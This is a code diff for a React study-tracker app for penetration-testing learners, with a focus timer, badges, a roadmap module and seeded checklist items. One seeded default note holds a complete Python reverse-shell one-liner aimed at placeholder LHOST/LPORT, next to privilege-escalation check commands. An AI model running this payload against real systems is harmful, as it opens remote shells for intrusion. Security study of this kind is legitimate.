+                            <div className="p-6 bg-gray-800 rounded-md border border-neon-green/30 shadow-lg">
+                                <h2 className="text-xl font-bold text-neon-green mb-3 border-b border-neon-green/50 pb-2">Mission Briefing</h2>
+                                <p className="text-gray-300 mb-4">
+                                    Current Rank: <span className="text-neon-green">Master Agent</span>. Your current objective is to maintain operational security and pursue targets assigned in the **Checklist**. Utilize the **Notes** module for critical intelligence gathering.
+                                </p>
+                                <ul className="list-disc list-inside text-sm text-gray-400 space-y-1">
+                                    <li>Tasks Completed: <span className="text-white font-bold">42</span></li>
+                                    <li>Focus Hours Logged: <span className="text-white font-bold">12h 45m</span></li>
+                                    <li>Total XP: <span className="text-white font-bold">{xp}</span></li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        {/* Recent Activity */}
+                        <div className="bg-gray-800 rounded-md border border-gray-700 p-6">
+                            <h2 className="text-xl font-bold text-neon-green mb-3 border-b border-neon-green/50 pb-2">Recent Activity</h2>
+                            <ul className="space-y-3 text-sm text-gray-400">
+                                <li className="flex justify-between items-center">
+                                    <span>[+5 XP] Task Added</span>
+                                    <span className="text-xs text-gray-500">5 min ago</span>
+                                </li>
+                                <li className="flex justify-between items-center">
+                                    <span>[+25 XP] Task Completed</span>
+                                    <span className="text-xs text-gray-500">1 hour ago</span>
+                                </li>
+                                <li className="flex justify-between items-center">
+                                    <span>Note Created: XSS Payload</span>
+                                    <span className="text-xs text-gray-500">3 hours ago</span>
+                                </li>
+                            </ul>
+                            <Button className="mt-4 w-full" neon={false}>View Full Logs</Button>
+                        </div>
+                    </div>
+                </>
+            );
+        };
+
+        // --- NEW: FOCUS TIMER LOGIC ---
+
+        const usePomodoro = (initialTime, setXp, xpReward) => {
+            const [time, setTime] = useState(initialTime);
+            const [isRunning, setIsRunning] = useState(false);
+            const [isFocus, setIsFocus] = useState(true); // true: focus, false: break
+            const intervalRef = useRef(null);
+            
+            const totalSeconds = isFocus ? TIME_FOCUS : TIME_BREAK;
+
+            // Effect to handle the countdown
+            useEffect(() => {
+                if (isRunning && time > 0) {
+                    intervalRef.current = setInterval(() => {
+                        setTime(prevTime => prevTime - 1);
+                    }, 1000);
+                } else if (time === 0) {
+                    setIsRunning(false);
+                    // Reward XP only on focus session completion
+                    if (isFocus) {
+                        setXp(prev => prev + xpReward);
+                        alert(`Focus Session Complete! Awarded ${xpReward} XP. Starting Break.`);
+                    } else {
+                        alert('Break Complete! Starting Focus Session.');
+                    }
+                    
+                    // Auto-switch to the next phase
+                    setIsFocus(prev => !prev);
+                    setTime(prev => prev === TIME_FOCUS ? TIME_BREAK : TIME_FOCUS);
+                }
+                
+                return () => clearInterval(intervalRef.current);
+            }, [isRunning, time, isFocus, setXp, xpReward]);
+
+            const startTimer = () => setIsRunning(true);
+            const pauseTimer = () => setIsRunning(false);
+            const resetTimer = () => {
+                clearInterval(intervalRef.current);
+                setIsRunning(false);
+                setIsFocus(true);
+                setTime(TIME_FOCUS);
+            };
+            
+            const progressPercent = ((totalSeconds - time) / totalSeconds) * 100;
+
+            return { time, isRunning, isFocus, startTimer, pauseTimer, resetTimer, progressPercent };
+        };
+
+        const FocusTimerView = ({ setXp }) => {
+            const { time, isRunning, isFocus, startTimer, pauseTimer, resetTimer, progressPercent } = usePomodoro(TIME_FOCUS, setXp, XP_FOCUS_SESSION);
+            
+            const statusText = isFocus ? 'FOCUS SEQUENCE ACTIVE' : 'BREAK SEQUENCE ACTIVE';
+            const statusColor = isFocus ? 'text-neon-green' : 'text-cyan-400';
+            const progressColor = isFocus ? 'bg-neon-green' : 'bg-cyan-400';
+            
+            return (
+                <>
+                    <Header title="Focus Timer (Pomodoro Unit)" />
+                    <div className="p-4 md:p-8">
+                        <div className="p-10 text-center bg-gray-800 rounded-md border border-neon-green/30">
+                            <div className="mb-8">
+                                <h2 className={`text-3xl font-bold mb-2 ${statusColor}`}>{statusText}</h2>
+                                <p className="text-gray-400">Next: {isFocus ? 'Break' : 'Focus'}</p>
+                            </div>
+
+                            {/* Timer Display */}
+                            <div className="text-8xl font-mono font-extrabold text-white mb-8">
+                                {formatTime(time)}
+                            </div>
+                            
+                            {/* Progress Bar */}
+                            <div className="w-full bg-gray-700 rounded-full h-4 mb-8">
+                                <div
+                                    className={`h-4 rounded-full ${progressColor} shadow-neon-glow transition-all duration-1000 ease-linear`}
+                                    style={{ width: `${progressPercent}%` }}
+                                ></div>
+                            </div>
+                            
+                            {/* Controls */}
+                            <div className="flex justify-center space-x-6">
+                                {isRunning ? (
+                                    <Button onClick={pauseTimer} className="bg-yellow-700 border-yellow-500 hover:bg-yellow-600">
+                                        <Icon name="PauseCircle" size={24} />
+                                        <span>PAUSE</span>
+                                    </Button>
+                                ) : (
+                                    <Button onClick={startTimer} className="bg-green-700 border-green-500 hover:bg-green-600">
+                                        <Icon name="PlayCircle" size={24} />
+                                        <span>START</span>
+                                    </Button>
+                                )}
+                                <Button onClick={resetTimer} neon={false} className="bg-gray-600 hover:bg-gray-500">
+                                    <Icon name="RotateCcw" size={24} />
+                                    <span>RESET</span>
+                                </Button>
+                            </div>
+                            <p className="text-xs text-gray-500 mt-6">
+                                Complete focus sessions to earn {XP_FOCUS_SESSION} XP.
+                            </p>
+                        </div>
+                    </div>
+                </>
+            );
+        };
+
+        const LogsView = () => (
+            <>
+                <Header title="System Logs" />
+                <div className="p-4 md:p-8">
+                    <div className="p-6 bg-gray-900 border border-neon-green/30 rounded-md h-96 overflow-y-scroll text-sm">
+                        <p className="text-neon-green">$ INITIALIZING KERNEL v1.7.0...</p>
+                        <p className="text-neon-green">$ AUTHENTICATION SUCCESSFUL: MASTER AGENT</p>
+                        <p className="text-gray-400">[2025-10-18 16:00:00] MODULE_NOTES: Notes loaded from local cache. Count: 5</p>
+                        <p className="text-gray-400">[2025-10-18 16:00:01] MODULE_CHECKLIST: Targets sync complete. Count: 8</p>
+                        <p className="text-yellow-400">[2025-10-18 16:00:05] WARNING: Focus Timer module not initialized. Productivity impact estimated at 30%.</p>
+                        <p className="text-neon-green">$ READY FOR COMMAND INPUT.</p>
+                        {[...Array(50)].map((_, i) => (
+                            <p key={i} className="text-gray-500 text-xs">
+                                [2025-10-18 16:0{i}] LOG_ENTRY: Placeholder message #{i + 1}.
+                            </p>
+                        ))}
+                    </div>
+                </div>
+            </>
+        );
+
+        const BadgesView = () => (
+            <>
+                <Header title="Badges (Achievements)" />
+                <div className="p-4 md:p-8 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                    {/* Example Badges */}
+                    <div className="p-4 bg-gray-800 rounded-md border border-neon-green/30 text-center">
+                        <Icon name="CheckCircle" size={32} className="mx-auto text-neon-green mb-2" />
+                        <h3 className="font-bold text-white">First Blood</h3>
+                        <p className="text-xs text-gray-400">Complete 1 Target</p>
+                    </div>
+                    <div className="p-4 bg-gray-800 rounded-md border border-neon-green/30 text-center opacity-50">
+                        <Icon name="Award" size={32} className="mx-auto text-gray-500 mb-2" />
+                        <h3 className="font-bold text-white">Note Taker</h3>
+                        <p className="text-xs text-gray-400">Create 20 Notes</p>
+                    </div>
+                    <div className="p-4 bg-gray-800 rounded-md border border-neon-green/30 text-center">
+                        <Icon name="Star" size={32} className="mx-auto text-yellow-400 mb-2" />
+                        <h3 className="font-bold text-white">Star Gazer</h3>
+                        <p className="text-xs text-gray-400">Star 10 Notes</p>
+                    </div>
+                    <div className="p-4 bg-gray-800 rounded-md border border-neon-green/30 text-center opacity-50">
+                        <Icon name="Timer" size={32} className="mx-auto text-gray-500 mb-2" />
+                        <h3 className="font-bold text-white">Deep Focus</h3>
+                        <p className="text-xs text-gray-400">Log 5 Focus Hours</p>
+                    </div>
+                </div>
+            </>
+        );
+
+
+        // --- ROADMAP MODULE (Integrated, road-wise, resources, XP) ---
+        // CRITICAL FIXES APPLIED: Refactored all state updates to use spread operators
+        // for correct immutability, replacing JSON.parse(JSON.stringify(s)).
+
+        function useRoadmaps() {
+            const STORAGE = 'userRoadmaps';
+            const [state, setState] = useLocalStorage(STORAGE, { goals: {}, milestones: {}, tasks: {} });
+
+            const addGoal = ({ title, targetDate = '', xpTarget = 100 }) => {
+                const id = (crypto.randomUUID ? crypto.randomUUID() : 'g-' + Math.random().toString(36).slice(2));
+                const goal = { id, title, targetDate, xpTarget: Number(xpTarget)||0, createdAt: getTimestamp(), milestoneIds: [] };
+                
+                setState(s => ({ 
+                    ...s, 
+                    goals: { ...s.goals, [id]: goal } 
+                }));
+                return id;
+            };
+
+            const deleteGoal = (id) => {
+                setState(s => {
+                    const goalToDelete = s.goals[id];
+                    if (!goalToDelete) return s;
+
+                    // 1. Collect all dependent milestone and task IDs
+                    const milestoneIdsToDelete = goalToDelete.milestoneIds || [];
+                    const taskIdsToDelete = milestoneIdsToDelete.flatMap(mid => s.milestones[mid]?.taskIds || []);
+
+                    // 2. Remove goals (immutably)
+                    const { [id]: _, ...remainingGoals } = s.goals;
+
+                    // 3. Remove milestones (immutably)
+                    const remainingMilestones = Object.fromEntries(
+                        Object.entries(s.milestones).filter(([mid]) => !milestoneIdsToDelete.includes(mid))
+                    );
+
+                    // 4. Remove tasks (immutably)
+                    const remainingTasks = Object.fromEntries(
+                        Object.entries(s.tasks).filter(([tid]) => !taskIdsToDelete.includes(tid))
+                    );
+
+                    return { goals: remainingGoals, milestones: remainingMilestones, tasks: remainingTasks };
+                });
+            };
+
+            const addMilestone = ({ goalId, title, dueDate = '', xpValue = 100 }) => {
+                const id = (crypto.randomUUID ? crypto.randomUUID() : 'm-' + Math.random().toString(36).slice(2));
+                const m = { id, goalId, title, dueDate, xpValue: Number(xpValue)||0, taskIds: [] };
+                
+                setState(s => ({
+                    ...s,
+                    milestones: { ...s.milestones, [id]: m },
+                    goals: {
+                        ...s.goals,
+                        [goalId]: {
+                            ...s.goals[goalId],
+                            milestoneIds: [...(s.goals[goalId]?.milestoneIds || []), id]
+                        }
+                    }
+                }));
+                return id;
+            };
+
+            const deleteMilestone = (id) => {
+                setState(s => {
+                    const m = s.milestones[id];
+                    if (!m) return s;
+
+                    // 1. Remove tasks (immutably)
+                    const taskIdsToDelete = m.taskIds || [];
+                    const remainingTasks = Object.fromEntries(
+                        Object.entries(s.tasks).filter(([tid]) => !taskIdsToDelete.includes(tid))
+                    );
+
+                    // 2. Remove milestone from milestone list (immutably)
+                    const { [id]: _, ...remainingMilestones } = s.milestones;
+
+                    // 3. Remove milestone ID from parent goal (immutably)
+                    const updatedGoal = {
+                        ...s.goals[m.goalId],
+                        milestoneIds: (s.goals[m.goalId]?.milestoneIds || []).filter(x => x !== id)
+                    };
+
+                    return {
+                        goals: { ...s.goals, [m.goalId]: updatedGoal },
+                        milestones: remainingMilestones,
+                        tasks: remainingTasks
+                    };
+                });
+            };
+
+            const addTask = ({ milestoneId, title, xp = 10, resources = [] }) => {
+                const id = (crypto.randomUUID ? crypto.randomUUID() : 't-' + Math.random().toString(36).slice(2));
+                const t = { id, milestoneId, title, xp: Number(xp)||0, completed: false, completedAt: null, resources };
+                
+                setState(s => ({
+                    ...s,
+                    tasks: { ...s.tasks, [id]: t },
+                    milestones: {
+                        ...s.milestones,
+                        [milestoneId]: {
+                            ...s.milestones[milestoneId],
+                            taskIds: [...(s.milestones[milestoneId]?.taskIds || []), id]
+                        }
+                    }
+                }));
+                return id;
+            };
+
+            const deleteTask = (id) => {
+                setState(s => {
+                    const t = s.tasks[id];
+                    if (!t) return s;
+
+                    // 1. Remove task from tasks list (immutably)
+                    const { [id]: _, ...remainingTasks } = s.tasks;
+
+                    // 2. Remove task ID from parent milestone's taskIds array (immutably)
+                    const parentMilestone = s.milestones[t.milestoneId];
+                    if (!parentMilestone) return { ...s, tasks: remainingTasks };
+
+                    const updatedMilestone = {
+                        ...parentMilestone,
+                        taskIds: (parentMilestone.taskIds || []).filter(x => x !== id)
+                    };
+
+                    return {
+                        ...s,
+                        tasks: remainingTasks,
+                        milestones: {
+                            ...s.milestones,
+                            [t.milestoneId]: updatedMilestone
+                        }
+                    };
+                });
+            };
+
+            // toggles and returns xp delta (positive when awarding, negative when removing)
+            const toggleTaskComplete = (id) => {
+                let delta = 0;
+                setState(s => {
+                    const t = s.tasks[id];
+                    if (!t) return s;
+
+                    const isNowCompleted = !t.completed;
+                    delta = isNowCompleted ? (t.xp || 0) : -(t.xp || 0);
+
+                    // Update task immutably
+                    const updatedTask = {
+                        ...t,
+                        completed: isNowCompleted,
+                        completedAt: isNowCompleted ? getTimestamp() : null
+                    };
+
+                    // Return new state
+                    return {
+                        ...s,
+                        tasks: { ...s.tasks, [id]: updatedTask }
+                    };
+                });
+                return delta;
+            };
+
+            const computeMilestoneProgress = (m, s) => {
+                const ids = (m?.taskIds || []);
+                if (!ids.length) return 0;
+                const done = ids.filter(tid => (s.tasks[tid] && s.tasks[tid].completed)).length;
+                return Math.round(done / ids.length * 100);
+            };
+
+            const computeGoalProgress = (g, s) => {
+                const mids = (g?.milestoneIds || []);
+                if (!mids.length) return 0;
+                const totalProgress = mids.reduce((acc, mid) => {
+                    const milestone = s.milestones[mid];
+                    if (!milestone) return acc;
+                    return acc + computeMilestoneProgress(milestone, s);
+                }, 0);
+                return Math.round(totalProgress / mids.length);
+            };
+
+            const earnedXP = () => Object.values(state.tasks).reduce((acc, t) => acc + ((t.completed) ? (Number(t.xp)||0) : 0), 0);
+
+            const exportJSON = () => {
+                const blob = new Blob([JSON.stringify(state, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `roadmaps-${new Date().toISOString().slice(0,10)}.json`;
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                URL.revokeObjectURL(url);
+            };
+
+            const importJSON = (obj, { merge = true } = {}) => {
+                if (!obj || typeof obj !== 'object') throw new Error('Invalid import JSON');
+                const { goals, milestones, tasks } = obj;
+                if (!goals || !milestones || !tasks) throw new Error('Invalid roadmap schema');
+                setState(s => {
+                    if (!merge) return obj;
+                    
+                    return {
+                        goals: { ...s.goals, ...goals },
+                        milestones: { ...s.milestones, ...milestones },
+                        tasks: { ...s.tasks, ...tasks }
+                    };
+                });
+            };
+
+            const resetAll = () => setState({ goals: {}, milestones: {}, tasks: {} });
+
+            return {
+                state, addGoal, deleteGoal, addMilestone, deleteMilestone, addTask, deleteTask, toggleTaskComplete,
+                computeMilestoneProgress, computeGoalProgress, earnedXP, exportJSON, importJSON, resetAll
+            };
+        }
+
+        function RoadmapView({ xp, setXp }) {
+            const rm = useRoadmaps();
+            const [selectedGoal, setSelectedGoal] = useState(null);
+            const [goalForm, setGoalForm] = useState({ title: '', targetDate: '', xpTarget: 200 });
+            const [milestoneForm, setMilestoneForm] = useState({ title: '', dueDate: '', xpValue: 100 });
+            const [taskForm, setTaskForm] = useState({ title: '', xp: 10, resources: '' });
+            const [isTaskFormOpen, setIsTaskFormOpen] = useState(null); // mid of milestone to open form for
+
+            useEffect(() => {
+                const goalIds = Object.keys(rm.state.goals);
+                if (!selectedGoal && goalIds.length) setSelectedGoal(goalIds[0]);
+                if (selectedGoal && !rm.state.goals[selectedGoal]) setSelectedGoal(null);
+            }, [rm.state.goals, selectedGoal]);
+
+            const handleAddGoal = (e) => {
+                e.preventDefault();
+                if (!goalForm.title.trim()) return alert('Title required');
+                const id = rm.addGoal(goalForm);
+                setGoalForm({ title: '', targetDate: '', xpTarget: 200 });
+                setSelectedGoal(id);
+            };
+
+            const handleAddMilestone = (e) => {
+                e.preventDefault();
+                if (!selectedGoal) return alert('Select a goal first');
+                if (!milestoneForm.title.trim()) return alert('Milestone title required');
+                rm.addMilestone({ ...milestoneForm, goalId: selectedGoal });
+                setMilestoneForm({ title: '', dueDate: '', xpValue: 100 });
+            };
+
+            const handleAddTask = (mid, e) => {
+                e.preventDefault();
+                if (!taskForm.title.trim()) return alert('Task title required');
+                const resources = taskForm.resources.split(',').map(s => s.trim()).filter(Boolean).map(u => ({ title: u, url: u }));
+                rm.addTask({ milestoneId: mid, title: taskForm.title, xp: taskForm.xp, resources });
+                setTaskForm({ title: '', xp: 10, resources: '' });
+                setIsTaskFormOpen(null); // Close form after adding
+            };
+
+            const handleToggleTask = (tid) => {
+                const delta = rm.toggleTaskComplete(tid);
+                if (delta !== 0 && typeof setXp === 'function') {
+                    setXp(prev => Math.max(0, prev + delta));
+                }
+            };
+
+            const handleExport = () => rm.exportJSON();
+            const handleImportFile = (file) => {
+                if (!file) return;
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    try {
+                        const json = JSON.parse(ev.target.result);
+                        rm.importJSON(json, { merge: true });
+                        alert('Import successful (merged).');
+                    } catch (err) { alert('Import failed: ' + err.message); }
+                };
+                reader.readAsText(file);
+            };
+
+            return (
+                <>
+                    <Header title="Roadmap" />
+                    <div className="p-4 md:p-8">
+                        <div className="flex flex-wrap gap-4 mb-4">
+                            <form onSubmit={handleAddGoal} className="flex flex-1 min-w-[300px] gap-2">
+                                <input value={goalForm.title} onChange={e=>setGoalForm({...goalForm,title:e.target.value})} placeholder="New goal title" className="flex-1 p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                <input type="date" value={goalForm.targetDate} onChange={e=>setGoalForm({...goalForm,targetDate:e.target.value})} className="p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                <input type="number" value={goalForm.xpTarget} onChange={e=>setGoalForm({...goalForm,xpTarget:e.target.value})} className="w-28 p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                <Button type="submit" className="px-3">Add Goal</Button>
+                            </form>
+
+                            <div className="flex gap-2">
+                                <Button onClick={handleExport} className="px-3" neon={false}>Export</Button>
+                                <label className="px-3 rounded-md flex items-center bg-gray-800 border border-gray-700 cursor-pointer text-sm font-semibold hover:bg-gray-700">
+                                    Import
+                                    <input type="file" accept=".json" style={{display:'none'}} onChange={e => e.target.files[0] && handleImportFile(e.target.files[0])} />
+                                </label>
+                                <Button onClick={() => { if(confirm('WARNING: Resetting all roadmap data. Continue?')) rm.resetAll(); }} className="px-3 bg-gray-800 border border-red-600 text-red-400" neon={false}>Reset</Button>
+                            </div>
+                        </div>
+
+                        <div className="flex gap-4">
+                            {/* Goals List (Left Panel) */}
+                            <div className="w-1/3 bg-gray-800 p-3 rounded-md border border-neon-green/20 overflow-y-auto max-h-[65vh]">
+                                {Object.keys(rm.state.goals).length === 0 && <div className="opacity-60 text-sm">No goals yet. Add one above.</div>}
+                                {Object.values(rm.state.goals).map(g => {
+                                    const prog = rm.computeGoalProgress(g, rm.state);
+                                    const earned = (() => {
+                                        const mids = g.milestoneIds || [];
+                                        return mids.reduce((acc, mid) => {
+                                            const m = rm.state.milestones[mid];
+                                            if (!m) return acc;
+                                            return acc + (m.taskIds||[]).reduce((a, tid) => a + ((rm.state.tasks[tid] && rm.state.tasks[tid].completed) ? Number(rm.state.tasks[tid].xp)||0 : 0), 0);
+                                        }, 0);
+                                    })();
+                                    return (
+                                        <div key={g.id} onClick={() => setSelectedGoal(g.id)} className={`p-3 mb-3 rounded-md cursor-pointer ${selectedGoal===g.id ? 'bg-neon-green/10 border border-neon-green' : 'bg-black/20'}`}>
+                                            <div className="flex justify-between">
+                                                <div className="font-semibold">{g.title}</div>
+                                                <div className="text-sm opacity-80">{prog}%</div>
+                                            </div>
+                                            <div className="w-full bg-gray-900 rounded-full h-2 mt-2 overflow-hidden">
+                                                <div style={{width: prog+'%', background: 'linear-gradient(90deg, var(--neon-green), #00d4ff)'}} className="h-2"></div>
+                                            </div>
+                                            <div className="text-xs opacity-70 mt-2 flex justify-between">
+                                                <div>XP: {earned}/{g.xpTarget}</div>
+                                                <div>{g.targetDate || 'no date'}</div>
+                                            </div>
+                                        </div>
+                                    );
+                                })}
+                            </div>
+
+                            {/* Milestones/Tasks (Right Panel) */}
+                            <div className="flex-1 bg-gray-800 p-4 rounded-md border border-neon-green/10 max-h-[65vh] overflow-y-auto">
+                                {!selectedGoal ? <div className="opacity-60">Select a goal to view details.</div> : (() => {
+                                    const g = rm.state.goals[selectedGoal];
+                                    if (!g) return <div className="opacity-60">Goal missing.</div>;
+                                    const milestones = (g.milestoneIds || []).map(mid => rm.state.milestones[mid]).filter(Boolean);
+                                    return (
+                                        <div>
+                                            <div className="flex justify-between items-start mb-4">
+                                                <div>
+                                                    <h3 className="text-xl font-bold text-neon-green">{g.title}</h3>
+                                                    <div className="text-xs opacity-70">Target: {g.targetDate || '—'} • XP Target: {g.xpTarget}</div>
+                                                </div>
+                                                <div className="flex gap-2">
+                                                    {/* NOTE: Simplified edit logic is kept for single-file MVP */}
+                                                    <Button onClick={() => { const t = prompt('Edit goal title', g.title); if (t) { rm.addGoal({ ...g, title: t }); rm.deleteGoal(g.id); setSelectedGoal(g.id); }}} className="px-2 bg-gray-900" neon={false}>Edit</Button>
+                                                    <Button onClick={() => { if (confirm('Delete goal? This removes milestones & tasks.')) { rm.deleteGoal(g.id); setSelectedGoal(null); } }} className="px-2 bg-red-700 border border-red-600 text-red-100" neon={false}>Delete</Button>
+                                                </div>
+                                            </div>
+
+                                            <form onSubmit={handleAddMilestone} className="flex gap-2 mb-4">
+                                                <input value={milestoneForm.title} onChange={e=>setMilestoneForm({...milestoneForm,title:e.target.value})} placeholder="Milestone title" className="flex-1 p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                                <input type="date" value={milestoneForm.dueDate} onChange={e=>setMilestoneForm({...milestoneForm,dueDate:e.target.value})} className="p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                                <input type="number" value={milestoneForm.xpValue} onChange={e=>setMilestoneForm({...milestoneForm,xpValue:e.target.value})} className="w-28 p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                                <Button type="submit" className="px-3">Add Milestone</Button>
+                                            </form>
+
+                                            <div className="space-y-4">
+                                                {milestones.length === 0 && <div className="opacity-60">No milestones yet.</div>}
+                                                {milestones.map(m => {
+                                                    const tasks = (m.taskIds || []).map(tid => rm.state.tasks[tid]).filter(Boolean);
+                                                    const mProg = rm.computeMilestoneProgress(m, rm.state);
+                                                    return (
+                                                        <div key={m.id} className="p-3 rounded-md bg-black/20 border border-gray-700">
+                                                            <div className="flex justify-between items-center mb-2">
+                                                                <div>
+                                                                    <strong className="text-white">{m.title}</strong>
+                                                                    <div className="text-xs opacity-70">Due: {m.dueDate || '—'} • XP: {m.xpValue} • {mProg}%</div>
+                                                                </div>
+                                                                <div className="flex gap-2">
+                                                                    <Button onClick={() => { const t = prompt('Edit milestone title', m.title); if (t) { rm.deleteMilestone(m.id); rm.addMilestone({goalId: g.id, title: t, dueDate: m.dueDate, xpValue: m.xpValue}); } }} className="px-2 bg-gray-900" neon={false}>Edit</Button>
+                                                                    <Button onClick={() => { if(confirm('Delete milestone?')) rm.deleteMilestone(m.id); }} className="px-2 bg-red-700 text-red-100" neon={false}>Del</Button>
+                                                                </div>
+                                                            </div>
+
+                                                            {/* Milestone Progress Bar */}
+                                                            <div className="w-full bg-gray-900 rounded-full h-2 mb-3 overflow-hidden">
+                                                                <div style={{width: mProg+'%', background: 'linear-gradient(90deg, #00d4ff, #6e00ff)'}} className="h-2 rounded-full"></div>
+                                                            </div>
+
+                                                            {/* Add Task Form Toggle */}
+                                                            <Button onClick={() => setIsTaskFormOpen(isTaskFormOpen === m.id ? null : m.id)} className="w-full text-xs mb-2 bg-gray-900 border-gray-700">
+                                                                <Icon name={isTaskFormOpen === m.id ? "Minus" : "Plus"} size={16} />
+                                                                <span>{isTaskFormOpen === m.id ? 'Hide Task Form' : '[+ NEW TASK]'}</span>
+                                                            </Button>
+
+                                                            {/* Add Task Form (Conditional) */}
+                                                            {isTaskFormOpen === m.id && (
+                                                                <form onSubmit={(e)=>handleAddTask(m.id,e)} className="flex flex-wrap gap-2 mb-3 p-3 bg-gray-900 border border-gray-700 rounded-md">
+                                                                    <input value={taskForm.title} onChange={e=>setTaskForm({...taskForm,title:e.target.value})} placeholder="Task title" className="flex-1 min-w-[150px] p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                                                    <input type="number" value={taskForm.xp} onChange={e=>setTaskForm({...taskForm,xp:e.target.value})} className="w-20 p-2 rounded-sm bg-gray-900 border border-gray-700" placeholder="XP"/>
+                                                                    <input value={taskForm.resources} onChange={e=>setTaskForm({...taskForm,resources:e.target.value})} placeholder="links (comma separated)" className="flex-1 min-w-[200px] p-2 rounded-sm bg-gray-900 border border-gray-700"/>
+                                                                    <Button type="submit" className="px-3">Add</Button>
+                                                                </form>
+                                                            )}
+
+
+                                                            <div className="space-y-2">
+                                                                {tasks.length === 0 && <div className="opacity-60 text-sm">No tasks yet.</div>}
+                                                                {tasks.map(t => (
+                                                                    <div key={t.id} className="flex justify-between items-start p-2 bg-gray-900/30 rounded-md">
+                                                                        <div className="flex items-start gap-3">
+                                                                            {/* CUSTOM CHECKBOX STYLE APPLIED */}
+                                                                            <input 
+                                                                                type="checkbox" 
+                                                                                checked={!!t.completed} 
+                                                                                onChange={()=>handleToggleTask(t.id)} 
+                                                                                className="w-4 h-4 mt-1 rounded-none accent-neon-green bg-gray-900 border-neon-green border-2 cursor-pointer flex-shrink-0" 
+                                                                            />
+                                                                            <div>
+                                                                                <div className={`font-medium ${t.completed ? 'line-through text-gray-500' : 'text-white'}`}>
+                                                                                    {t.title} <span className="text-xs opacity-70">({t.xp} XP)</span>
+                                                                                </div>
+                                                                                {t.resources && t.resources.length > 0 && (
+                                                                                    <div className="text-xs mt-1 opacity-70">
+                                                                                        Links: {t.resources.map((r,i)=>(
+                                                                                            <a key={i} href={r.url} target="_blank" rel="noreferrer" className="text-cyan-300 underline ml-1 truncate max-w-[200px] inline-block">{r.title || r.url}</a>
+                                                                                        ))}
+                                                                                    </div>
+                                                                                )}
+                                                                            </div>
+                                                                        </div>
+                                                                        <div className="flex gap-2 flex-shrink-0">
+                                                                            <Button onClick={()=>{ const nt = prompt('Edit task title', t.title); if (nt) { rm.deleteTask(t.id); rm.addTask({milestoneId: m.id, title: nt, xp: t.xp, resources: t.resources}); }}} className="px-2 bg-gray-900 text-xs" neon={false}>Edit</Button>
+                                                                            <Button onClick={()=>{ if(confirm('Delete task?')) rm.deleteTask(t.id); }} className="px-2 bg-red-700 text-red-100 text-xs" neon={false}>Del</Button>
+                                                                        </div>
+                                                                    </div>
+                                                                ))}
+                                                            </div>
+                                                        </div>
+                                                    );
+                                                })}
+                                            </div>
+                                        </div>
+                                    );
+                                })()}
+                            </div>
+                        </div>
+                    </div>
+                </>
+            );
+        }
+
+        // --- MAIN APP COMPONENT ---
+
+        const App = () => {
+            const [currentView, setCurrentView] = useLocalStorage('appView', 'dashboard');
+            const [xp, setXp] = useLocalStorage('userXp', 450);
+            
+            // Initial data for Checklist
+            const defaultTasks = [
+                { id: 't1', title: 'Setup Kali VM & Snapshot', domain: 'Setup', status: STATUS_COMPLETED, dateAdded: '2025-10-01T10:00:00Z', dateUpdated: '2025-10-01T10:00:00Z' },
+                { id: 't2', title: 'Learn Basic Nmap Commands', domain: 'Network', status: STATUS_IN_PROGRESS, dateAdded: '2025-10-02T10:00:00Z', dateUpdated: '2025-10-18T16:00:00Z' },
+                { id: 't3', title: 'Read the OWASP Top 10 for 2021', domain: 'Web', status: STATUS_NOT_STARTED, dateAdded: '2025-10-05T10:00:00Z', dateUpdated: '2025-10-05T10:00:00Z' },
+                { id: 't4', title: 'Practice using Burp Suite Repeater', domain: 'Web', status: STATUS_NOT_STARTED, dateAdded: '2025-10-10T10:00:00Z', dateUpdated: '2025-10-10T10:00:00Z' },
+            ];
+            const [tasks, setTasks] = useLocalStorage('userTasks', defaultTasks);
+
+            // Initial data for Notes
+            const defaultNotes = [
+                { id: 'n1', title: 'Default Nmap Scan Syntax', content: 'nmap -sC -sV -O <target_ip>\n-sC: Script scan using default scripts\n-sV: Version detection\n-O: OS detection', starred: true, dateCreated: '2025-09-28T10:00:00Z', dateUpdated: '2025-10-15T10:00:00Z' },
+                { id: 'n2', title: 'Basic Linux Privilege Escalation Steps', content: '1. Kernel/OS checks (uname -a)\n2. SUID/SGID files (find / -perm -4000 2>/dev/null)\n3. Weak service permissions (ls -la /etc/init.d/)\n4. Check for user sudo access (sudo -l)', starred: false, dateCreated: '2025-10-01T12:00:00Z', dateUpdated: '2025-10-18T16:00:00Z' },
+                { id: 'n3', title: 'Reverse Shell Payloads', content: 'Python: python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'', starred: true, dateCreated: '2025-10-10T08:00:00Z', dateUpdated: '2025-10-10T08:00:00Z' },
+            ];
+            const [notes, setNotes] = useLocalStorage('userNotes', defaultNotes);
+            
+            // Available Domains for Checklist/Notes (for easy filtering)
+            const domains = ['Setup', 'Network', 'Web', 'Exploitation', 'Post-Exploitation', 'TTPs', 'General'];
+
+            // FIX: Call createIcons globally after every render to ensure dynamic content icons are visible
+            useEffect(() => {
+                if (typeof lucide !== 'undefined' && lucide.createIcons) {
+                    lucide.createIcons();
+                }
+            });
+
+            // --- View Renderer ---
+
+            const renderView = () => {
+                switch (currentView) {
+                    case 'checklist':
+                        return <ChecklistView xp={xp} setXp={setXp} tasks={tasks} setTasks={setTasks} domains={domains} />;
+                    case 'notes':
+                        return <NotesView notes={notes} setNotes={setNotes} />;
+                    case 'roadmap':
+                        return <RoadmapView xp={xp} setXp={setXp} />; 
+                    case 'focus_timer':
+                        return <FocusTimerView setXp={setXp} />; // Now implemented
+                    case 'logs':
+                        return <LogsView />;
+                    case 'badges':
+                        return <BadgesView />;
+                    case 'dashboard':
+                    default:
+                        return <DashboardView xp={xp} />;
+                }
